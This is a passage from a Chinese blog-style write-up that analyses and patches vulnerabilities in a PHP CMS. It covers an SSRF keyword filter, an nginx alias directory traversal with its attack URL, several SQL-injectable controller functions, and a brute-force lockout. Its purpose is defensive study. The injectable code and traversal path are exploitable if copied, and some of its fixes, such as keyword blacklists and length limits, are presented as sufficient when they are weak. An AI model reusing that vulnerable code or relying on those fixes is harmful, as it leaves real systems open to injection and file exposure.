<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file|ftp|tftp|gopher|dict|localhost|127\.0\.0\.1|3232235521|2130706433|0x|0177\.0\.0\.01|0\.0\.0\.0|xip|@/i&quot;</span>,<span class="hljs-variable">$url</span>))&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;you are a hacker!!!&quot;</span>);
&#125;</code></pre>

<p>解释一下为什么要用上面的正则过滤url</p>
<ul>
<li><p>file|ftp|tftp|gopher|dict</p>
<p>是让改url只能使用http&#x2F;https协议，这样可以避免大部分的攻击。</p>
</li>
<li><p>localhost|127.0.0.1</p>
<p>是为了防止攻击者探测内网端口，以免泄露一些容易被攻击的应用程序</p>
</li>
<li><p>3232235521|2130706433|0x|0177.0.0.01|0.0.0.0</p>
<p>这几个是为了防止攻击者对127.0.0.1进行八进制，十六进制，十进制的转码，从而绕过之前的检测</p>
</li>
<li><p>xip|@</p>
<p>这两个是防止攻击者使用302跳转攻击</p>
</li>
</ul>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420142252510.png" alt="image-20210420142252510" style="zoom: 33%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420142336577.png" alt="image-20210420142336577" style="zoom: 33%;"></p>
<h2 id="4-目录遍历-1"><a href="#4-目录遍历-1" class="headerlink" title="4.目录遍历"></a>4.目录遍历</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>nginx.conf</code></p>
<pre><code class="hljs awk">location /files &#123;
		  autoindex on;
        alias  <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/public/u</span>ploads/;
&#125;</code></pre>

<p>files后少写一个&#x2F;</p>
<p>输入url<code>http://192.168.164.147/files../</code>时，相当于访问的是<code>/var/www/public/uploads/../</code>，所以访问的就是<code>/var/www/public/</code>目录。</p>
<h3 id="漏洞防御-3"><a href="#漏洞防御-3" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>该漏洞修复方法很简单</p>
<p>修改<code>nginx.conf</code></p>
<pre><code>location /files/ &#123;
          autoindex on;
        alias  /var/www/public/uploads/;
&#125;
</code></pre>
<h2 id="5-SQL注入"><a href="#5-SQL注入" class="headerlink" title="5.SQL注入"></a>5.SQL注入</h2><h3 id="漏洞点一-5"><a href="#漏洞点一-5" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h4><p>代码位置<code>application\change\controller\Changepass.php</code></p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isPost</span>()) &#123;
        <span class="hljs-variable">$account</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;account&#x27;</span>];
        <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
        <span class="hljs-variable">$npassword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;npassword&#x27;</span>];
        <span class="hljs-variable">$newpassword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;newpassword&#x27;</span>];
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$account</span> != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-variable">$password</span> != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-variable">$npassword</span> != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-variable">$newpassword</span> !=<span class="hljs-string">&#x27;&#x27;</span>)&#123;
            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$npassword</span> === <span class="hljs-variable">$newpassword</span>) &#123;
                <span class="hljs-variable">$result</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select `username` from yzn_member where username=&#x27;<span class="hljs-subst">$account</span>&#x27;&quot;</span>);
                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>)) &#123;
                    <span class="hljs-variable">$sql</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select `password`,`encrypt` from yzn_member where username=&#x27;<span class="hljs-subst">$account</span>&#x27;&quot;</span>);
                    <span class="hljs-variable">$encrypt</span> = <span class="hljs-variable">$sql</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;encrypt&#x27;</span>];
                    <span class="hljs-variable">$encrypt_password</span> = <span class="hljs-variable">$password</span> . <span class="hljs-variable">$encrypt</span>;
                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$sql</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$encrypt_password</span>)) &#123;
                        <span class="hljs-variable">$pwd</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$newpassword</span>.<span class="hljs-variable">$encrypt</span>);
                        <span class="hljs-variable">$change</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;UPDATE `yzn_member` SET `password`=&#x27;<span class="hljs-subst">$pwd</span>&#x27; WHERE username=&#x27;<span class="hljs-subst">$account</span>&#x27;&quot;</span>);
                        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">success</span>(<span class="hljs-string">&quot;successful!&quot;</span>);
                    &#125; <span class="hljs-keyword">else</span> &#123;
                        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;wrong password!&quot;</span>);
                    &#125;
                &#125; <span class="hljs-keyword">else</span> &#123;
                    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;no user!&quot;</span>);
                &#125;
            &#125;
            <span class="hljs-keyword">else</span>&#123;
                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;new password are different!&quot;</span>);
            &#125;
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;please input content!!!&quot;</span>);
        &#125;
    &#125;</code></pre>

<p>这段代码的意思就是，先检查用户的输入是否为空，不为空则判断两次输入的新密码是否一样，一样先到数据库中查找该用户，如果有该用户，则取出该用户的密码和加密因子，然后判断旧密码是否正确，正确则将新密码和加密因子的md5值写入数据库，密码修改成功。</p>
<p>这里可以看到并没有返回查询的信息，但是也没有对用户输入的数据进行检查和过滤，所以攻击根据错误提示进行盲注攻击。</p>
<h4 id="漏洞防御-4"><a href="#漏洞防御-4" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><ul>
<li><p><strong>方法一</strong></p>
<p>对sql注入使用的关键词进行过滤，写一个waf对输入的数据进行检查</p>
<p>这里的话只需要对用户名进行过滤，因为只有用户名被带入到sql语句中进行查询</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inject_check</span>(<span class="hljs-params"><span class="hljs-variable">$Sql_Str</span></span>) </span>&#123;<span class="hljs-comment">//检测Sql的注入语句。</span>
   <span class="hljs-variable">$check</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\&#x27;|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i&#x27;</span>,<span class="hljs-variable">$Sql_Str</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$check</span>) &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;hacker!!!&quot;</span>)
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Sql_Str</span>;
    &#125;
&#125;</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420144316454.png" alt="image-20210420144316454" style="zoom:67%;">

<p>可以看到使用bp进行注入fuzzing，可以发现很多payload都已经被过滤</p>
</li>
<li><p><strong>方法二</strong></p>
<p>第一种方法很简单，就是限制用户名和密码的长度，然后对用户的输入进行长度限制</p>
<p>因为是用户名和密码位置，用户名的长度一般不会超过20个字符，密码也不会超过20个字符，那么这里只需要在用户提交完数据后，在后端检测用户名和密码的长度，这样就可以让sql注入攻击无法发挥威力，因为在20个字符范围之内很难构造出有效的攻击语句。</p>
</li>
</ul>
<h3 id="漏洞点二-5"><a href="#漏洞点二-5" class="headerlink" title="漏洞点二"></a><strong>漏洞点二</strong></h3><h4 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h4><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jifen</span>(<span class="hljs-params"></span>)</span>&#123;
    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;&quot;</span>;
    <span class="hljs-variable">$point</span>=<span class="hljs-number">0</span>;
    <span class="hljs-variable">$id</span> = <span class="hljs-variable language_">$this</span>-&gt;userid;
    <span class="hljs-variable">$sql</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select `point` from yzn_member where id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];
    <span class="hljs-variable">$point</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;point&#x27;</span>];
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]!==<span class="hljs-string">&#x27;&#x27;</span>)&#123;
        <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];
        <span class="hljs-variable">$num</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>];
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> !== <span class="hljs-variable language_">$this</span>-&gt;userinfo[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$num</span> &lt;= <span class="hljs-variable">$point</span>)&#123;
            <span class="hljs-variable">$result</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select `point` from yzn_member where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];
            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>))&#123;
                <span class="hljs-variable">$new_point</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;point&#x27;</span>] + <span class="hljs-variable">$num</span>;
                <span class="hljs-variable">$point</span> = <span class="hljs-variable">$point</span> - <span class="hljs-variable">$num</span>;
                <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;UPDATE `yzn_member` SET `point`=&#x27;<span class="hljs-subst">$point</span>&#x27; WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>);
                <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;UPDATE `yzn_member` SET `point`=&#x27;<span class="hljs-subst">$new_point</span>&#x27; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;成功向&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;赠送&quot;</span>.(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$num</span>.<span class="hljs-string">&quot;积分!&quot;</span>;
                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;/jifen&#x27;</span>,[<span class="hljs-string">&#x27;point&#x27;</span>=&gt;<span class="hljs-variable">$point</span>,<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);
            &#125;<span class="hljs-keyword">else</span>&#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;不存在该用户！&quot;</span>;
                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;/jifen&#x27;</span>,[<span class="hljs-string">&#x27;point&#x27;</span>=&gt;<span class="hljs-variable">$point</span>,<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);
            &#125;
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;注意用户名不能是自己且积分数点数需要小于自己当前积分!&quot;</span>;
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;/jifen&#x27;</span>,[<span class="hljs-string">&#x27;point&#x27;</span>=&gt;<span class="hljs-variable">$point</span>,<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);
        &#125;
    &#125;</code></pre>

<p>在这段代码中会将用户提交的用户名带到sql语句中查询</p>
<pre><code class="hljs php"><span class="hljs-variable">$result</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select `point` from yzn_member where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];</code></pre>

<p>虽然此处没有返回值，但是如果查询失败就会提示<code>$msg=&quot;不存在该用户！&quot;</code>，导致攻击者可以使用盲注攻击</p>
<h4 id="漏洞防御-5"><a href="#漏洞防御-5" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>同样可以直接使用上面的过滤函数</p>
<h3 id="漏洞点三-3"><a href="#漏洞点三-3" class="headerlink" title="漏洞点三"></a><strong>漏洞点三</strong></h3><h4 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>application\member\controller\Index.php</code>中的<code>finduser</code>方法</p>
<pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">finduser</span>(<span class="hljs-params"></span>)</span>&#123;
  	<span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$email</span> = <span class="hljs-string">&#x27;&#x27;</span>;	
      <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]!==<span class="hljs-string">&#x27;&#x27;</span>)&#123;
      	<span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];
      	<span class="hljs-variable">$deny_str</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;select&#x27;</span>,<span class="hljs-string">&#x27;from&#x27;</span>,<span class="hljs-string">&#x27;or&#x27;</span>,<span class="hljs-string">&#x27;and&#x27;</span>);
      	<span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_str</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$username</span>);
      	<span class="hljs-variable">$result</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select `email` from yzn_member where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];

      	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>))&#123;
      		<span class="hljs-variable">$email</span> = <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;email&#x27;</span>];
      		<span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;查询成功! &#x27;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&#x27;的邮箱是:&#x27;</span>;
	<span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;/finduser&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>,<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$username</span>,<span class="hljs-string">&#x27;email&#x27;</span>=&gt;<span class="hljs-variable">$email</span>]);
      	&#125;<span class="hljs-keyword">else</span>&#123;
      		<span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;查询失败，&#x27;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&#x27;不存在,请检查用户名是否正确!&#x27;</span>;
      		<span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;/finduser&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);
      	&#125;
      &#125;
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;/finduser&#x27;</span>);
  &#125;</code></pre>

<p>可以看到，对用户提交的数据进行了过滤，但是过滤的内容很少，而且很容易就被绕过</p>
<h4 id="漏洞防御-6"><a href="#漏洞防御-6" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>这里的防御就可以直接使用上面过滤函数</p>
<h3 id="漏洞点四-2"><a href="#漏洞点四-2" class="headerlink" title="漏洞点四"></a><strong>漏洞点四</strong></h3><p>代码位置<code>application\member\controller\Content.php</code></p>
<h4 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h4><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">param</span>(<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-number">0</span>);
            <span class="hljs-variable">$info</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;SELECT * FROM `yzn_member_content` WHERE `uid` = &#x27;</span>.<span class="hljs-variable">$this</span>-&gt;userid.<span class="hljs-string">&#x27; AND `id` = &#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&#x27; LIMIT 1&#x27;</span>)[<span class="hljs-number">0</span>];
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$info</span>)) &#123;
                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;稿件不存在！&#x27;</span>);
            &#125;</code></pre>

<p>这里直接将用户提交的数据id，带入到sql语句中查询，并且没有进行过滤</p>
<h4 id="漏洞防御-7"><a href="#漏洞防御-7" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p><strong>方法一</strong></p>
<p>  因为id是一个数字，那么直接对id这个参数进行限制，只允许用户提交数字型数据</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$id</span>))&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;id必须是数字！&quot;</span>)
&#125;</code></pre>

<p><strong>方法二</strong></p>
<p>与上面的方法二一样，对id参数进行过滤</p>
<h2 id="6-暴力破解-1"><a href="#6-暴力破解-1" class="headerlink" title="6.暴力破解"></a>6.暴力破解</h2><h3 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h3><p>该漏洞存在于管理员后台登录，造成该漏洞的原因大多是因为管理人员没有修改初始密码，或者心存侥幸改成了比较常见的密码，这样就给了攻击者可乘之机，直接使用暴力破解就可以攻克后台管理页面。</p>
<p>代码位于<code>application\admin\controller\Index.php</code>中的<code>login()</code>方法</p>
<pre><code class="hljs php"> <span class="hljs-comment">//登录判断</span>
 <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"> </span>&#123;
     <span class="hljs-variable">$url</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-string">&#x27;index/index&#x27;</span>);
     <span class="hljs-keyword">if</span> (<span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">instance</span>()-&gt;<span class="hljs-title function_ invoke__">isLogin</span>()) &#123;
         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;admin/index/index&#x27;</span>);
     &#125;
     <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isPost</span>()) &#123;
         <span class="hljs-variable">$data</span>      = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">post</span>();
         <span class="hljs-variable">$keeplogin</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">&#x27;keeplogin&#x27;</span>);
<span class="hljs-comment">// 对提交数据进行检查</span>
         <span class="hljs-variable">$rule</span> = [
             <span class="hljs-string">&#x27;username|用户名&#x27;</span> =&gt; <span class="hljs-string">&#x27;require|alphaDash|length:3,20&#x27;</span>,
             <span class="hljs-string">&#x27;password|密码&#x27;</span>  =&gt; <span class="hljs-string">&#x27;require|length:3,20&#x27;</span>,
             <span class="hljs-string">&#x27;__token__&#x27;</span>    =&gt; <span class="hljs-string">&#x27;require|token&#x27;</span>,
         ];
         <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">validate</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$rule</span>);
         <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> !== <span class="hljs-variable">$result</span>) &#123;
             <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$result</span>, <span class="hljs-variable">$url</span>, [<span class="hljs-string">&#x27;token&#x27;</span> =&gt; <span class="hljs-variable">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">token</span>()]);
         &#125;
         <span class="hljs-keyword">if</span> (<span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">instance</span>()-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$keeplogin</span> ? <span class="hljs-number">86400</span> : <span class="hljs-number">0</span>)) &#123;
             <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">success</span>(<span class="hljs-string">&#x27;恭喜您，登陆成功&#x27;</span>, <span class="hljs-title function_ invoke__">url</span>(<span class="hljs-string">&#x27;admin/Index/index&#x27;</span>));
         &#125; <span class="hljs-keyword">else</span> &#123;
             <span class="hljs-variable">$msg</span> = <span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">instance</span>()-&gt;<span class="hljs-title function_ invoke__">getError</span>();
             <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$msg</span> ? <span class="hljs-variable">$msg</span> : <span class="hljs-string">&#x27;用户名或者密码错误!&#x27;</span>;
             <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$msg</span>, <span class="hljs-variable">$url</span>, [<span class="hljs-string">&#x27;token&#x27;</span> =&gt; <span class="hljs-variable">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">token</span>()]);
         &#125;
     &#125; <span class="hljs-keyword">else</span> &#123;
         <span class="hljs-keyword">if</span> (<span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">instance</span>()-&gt;<span class="hljs-title function_ invoke__">autologin</span>()) &#123;
             <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;admin/index/index&#x27;</span>);
         &#125;
         <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();
     &#125;
 &#125;</code></pre>



<p>虽然每次登录都需要带有token，但是也是不安全的，因为token的值是可以从前端页面获取的</p>
<h3 id="漏洞防御-8"><a href="#漏洞防御-8" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>防御方法就是限制管理员登录时密码输入的错误次数，当错误次数达到一定数量时，就锁定该账号，需要拥有数据库管理权限的真正管理员才能重新登录。</p>
<p>首先在数据库中创建一个表<code>yzn_loginfo</code>，里面只需要一个字段，用来记录admin账号连续输入错误密码的次数。</p>
<p>具体方法为</p>
<p>首先进入mysql容器内部</p>
<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> ed1c19bb4a95 bash</code></pre>

<p>之后登录root账号，在数据库中建立一张表</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> `yzn_loginfo` (
  `login_fail` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
) ENGINE=MyISAM <span class="hljs-keyword">DEFAULT</span> CHARSET=utf8;</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408102912089.png" alt="image-20210408102912089"></p>
<p>修改代码<code>application\admin\controller\Index.php</code>中的<code>login()</code>方法</p>
<p>其中戴&#x2F;&#x2F; 是增加的代码</p>
<pre><code class="hljs php"><span class="hljs-comment">// 从yzn_loginfo表中获取到 login_fail的值</span>
<span class="hljs-variable">$login_fail</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;SELECT * FROM `yzn_loginfo`&#x27;</span>)[<span class="hljs-number">0</span>]; <span class="hljs-comment">//</span>
         <span class="hljs-variable">$login_fail_count</span> = <span class="hljs-variable">$login_fail</span>[<span class="hljs-string">&#x27;login_fail&#x27;</span>];     <span class="hljs-comment">// </span>
<span class="hljs-comment">// 如果密码错误超过 5 则锁定账号</span>
         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$login_fail_count</span> &gt;= <span class="hljs-number">5</span>)&#123;                        <span class="hljs-comment">//	</span>
             <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;账号被锁定，请联系网站管理员！&quot;</span>;			 <span class="hljs-comment">//</span>
             <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$msg</span>,<span class="hljs-variable">$url</span>);					   <span class="hljs-comment">//</span>
         &#125;

         <span class="hljs-keyword">if</span> (<span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">instance</span>()-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$keeplogin</span> ? <span class="hljs-number">86400</span> : <span class="hljs-number">0</span>)) &#123;
          <span class="hljs-comment">// 如果输入的密码正确，说明是真正的admin，将login_fail值更新为0</span>
             <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;UPDATE `yzn_loginfo` SET `login_fail`=0 WHERE `login_fail`=&#x27;</span>.<span class="hljs-variable">$login_fail_count</span>); 							<span class="hljs-comment">// </span>
             <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">success</span>(<span class="hljs-string">&#x27;恭喜您，登陆成功&#x27;</span>, <span class="hljs-title function_ invoke__">url</span>(<span class="hljs-string">&#x27;admin/Index/index&#x27;</span>));
         &#125; <span class="hljs-keyword">else</span> &#123;
